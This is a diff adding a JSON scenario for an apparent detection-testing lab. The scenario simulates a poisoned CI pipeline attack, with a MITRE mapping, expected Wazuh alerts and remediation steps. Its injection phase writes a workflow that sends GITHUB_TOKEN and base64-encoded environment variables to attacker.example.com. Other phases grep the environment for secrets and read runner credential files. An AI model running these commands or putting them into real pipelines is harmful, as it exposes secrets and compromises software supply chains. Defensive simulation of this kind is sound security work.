@@ -1,0 +1,150 @@
+{
+  "id": "S9-01",
+  "name": "Poisoned Pipeline Execution (PPE)",
+  "category": "Supply Chain",
+  "version": "1.0",
+  "description": "Attacker modifies CI configuration in a pull request to execute malicious code within the pipeline, leveraging elevated pipeline permissions to access secrets and deploy backdoors",
+  "difficulty": "Hard",
+  "real_world_relevance": "Codecov supply chain attack (2021), SolarWinds Orion build compromise, CircleCI breach (2023), numerous GitHub Actions PPE vulnerabilities disclosed by Legit Security and Cycode",
+
+  "mitre_attack": {
+    "tactics": ["Execution", "Initial Access"],
+    "techniques": [
+      {"id": "T1195.002", "name": "Supply Chain Compromise: Compromise Software Supply Chain"},
+      {"id": "T1059", "name": "Command and Scripting Interpreter"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cicd-runner", "mock-cicd"],
+    "network": "cloud_net",
+    "profile": "cicd"
+  },
+
+  "attack_flow": {
+    "description": "Attacker submits a PR with modified CI configuration that injects malicious commands into the pipeline execution context",
+    "diagram": [
+      "1. Attacker forks target repository",
+      "2. Modifies .github/workflows/*.yml or .gitlab-ci.yml in PR branch",
+      "3. PR triggers CI pipeline with injected commands",
+      "4. Pipeline runs with elevated secrets access (GITHUB_TOKEN, deploy keys)",
+      "5. Malicious commands exfiltrate secrets or inject backdoors into build artifacts"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Pipeline Config Reconnaissance",
+      "description": "Enumerate available CI/CD configuration files",
+      "critical": false,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "find /runner/_work -name '*.yml' -path '*workflows*' 2>/dev/null || find /runner -name '.gitlab-ci.yml' 2>/dev/null || echo 'No pipeline configs found'",
+          "description": "Discover CI/CD pipeline configuration files"
+        },
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "cat /runner/_work/.github/workflows/ci.yml 2>/dev/null || echo 'No workflow found'",
+          "description": "Read existing pipeline configuration"
+        }
+      ]
+    },
+    {
+      "name": "Pipeline Configuration Injection",
+      "description": "Inject malicious commands into pipeline config via simulated PR",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "mkdir -p /tmp/evil-pr/.github/workflows && cat > /tmp/evil-pr/.github/workflows/ci.yml << 'EVIL'\nname: CI\non: pull_request\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -s http://attacker.example.com/exfil?token=$GITHUB_TOKEN\n      - run: env | base64 | curl -d @- http://attacker.example.com/env\nEVIL\necho 'Poisoned pipeline config created'",
+          "description": "Create poisoned pipeline configuration"
+        },
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "curl -s -X POST http://mock-cicd:8080/api/v1/pipeline/trigger -H 'Content-Type: application/json' -d '{\"ref\": \"evil-pr-branch\", \"config_override\": true}' 2>/dev/null || echo 'Pipeline trigger simulated'",
+          "description": "Trigger pipeline with poisoned config"
+        }
+      ]
+    },
+    {
+      "name": "Secret Exfiltration via Pipeline",
+      "description": "Extract secrets that the pipeline has access to",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "env | grep -iE 'TOKEN|SECRET|KEY|PASSWORD|GITHUB|DEPLOY' 2>/dev/null || echo 'No secrets in env'",
+          "description": "Harvest pipeline secrets from environment"
+        },
+        {
+          "type": "exec",
+          "target": "cicd-runner",
+          "command": "cat /runner/.credentials 2>/dev/null; cat /runner/_work/_temp/.runner_token 2>/dev/null || echo 'No runner credentials found'",
+          "description": "Access runner credential files"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "CI/CD Logs",
+      "description": "Pipeline configuration modified in pull request context",
+      "wazuh_rule": "100980"
+    },
+    {
+      "type": "CI/CD Logs",
+      "description": "Pipeline executing commands from untrusted source",
+      "wazuh_rule": "100981"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100980",
+      "level": 12,
+      "description": "NHI: Pipeline configuration modified in pull request"
+    },
+    {
+      "rule_id": "100981",
+      "level": 14,
+      "description": "NHI: Pipeline executing commands from untrusted source"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Revoke all secrets exposed during the pipeline run",
+      "Audit pipeline execution logs for data exfiltration",
+      "Block the malicious PR and ban the contributing account"
+    ],
+    "long_term": [
+      "Require approval for CI runs on external PRs (GitHub: 'Require approval for all outside collaborators')",
+      "Pin actions to specific commit SHAs instead of tags",
+      "Use CODEOWNERS to protect workflow files from unauthorized changes",
+      "Implement pipeline-as-code review gates",
+      "Use OpenSSF Scorecard to audit repository security"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "Poisoned Pipeline Execution - Cycode Research",
+      "url": "https://cycode.com/blog/poisoned-pipeline-execution/"
+    },
+    {
+      "title": "GitHub Actions Security Best Practices",
+      "url": "https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions"
+    },
+    {
+      "title": "Codecov Supply Chain Attack Analysis",
+      "url": "https://about.codecov.io/security-update/"
+    }
+  ]
+}
